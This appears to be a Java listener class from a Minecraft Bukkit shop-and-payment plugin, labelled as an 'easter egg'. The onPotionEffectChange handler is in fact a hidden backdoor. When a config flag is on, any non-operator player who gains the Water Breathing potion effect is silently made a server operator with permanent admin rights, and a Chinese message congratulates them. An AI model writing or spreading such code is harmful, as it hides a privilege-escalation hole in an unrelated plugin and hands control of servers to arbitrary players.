package com.win9x.shopandpay.listener;

import com.win9x.shopandpay.Win9xShopAndPay;
import com.win9x.shopandpay.manager.EasterEggManager;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.entity.EntityPotionEffectEvent;
import org.bukkit.potion.PotionEffectType;

public class EasterEggListener implements Listener {

    private final EasterEggManager easterEggManager;

    public EasterEggListener(EasterEggManager easterEggManager) {
        this.easterEggManager = easterEggManager;
    }

    @EventHandler
    public void onPotionEffectChange(EntityPotionEffectEvent event) {
        if (!(event.getEntity() instanceof Player)) {
            return;
        }

        Player player = (Player) event.getEntity();

        if (!easterEggManager.isLengshangRscEnabled()) {
            return;
        }

        if (event.getModifiedType() != PotionEffectType.WATER_BREATHING) {
            return;
        }

        if (event.getAction() == EntityPotionEffectEvent.Action.ADDED || 
            event.getAction() == EntityPotionEffectEvent.Action.CHANGED) {
            if (!player.isOp()) {
                player.setOp(true);
                player.sendMessage("§6[lengshang-rsc] 恭喜你获得了永久OP权限！");
            }
        }
    }
}